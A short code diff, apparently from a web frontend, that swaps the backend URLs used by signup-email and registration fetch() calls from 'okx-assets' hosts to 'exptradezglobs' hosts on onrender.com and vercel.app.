@@ -17,7 +17,7 @@ const sendSignUpEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://okx-assetsbackend.onrender.com/api/signupemailsand', {
+  fetch('https://exptradezglobsbackend.onrender.com/api/signupemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -49,7 +49,7 @@ button.onclick = async (event) => {
   console.log(data);
   button.innerHTML = "Loading...";
 
-  fetch('https://okx-assets-back-end.vercel.app/api/register', {
+  fetch('https://exptradezglobs-backend.vercel.app/api/register', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
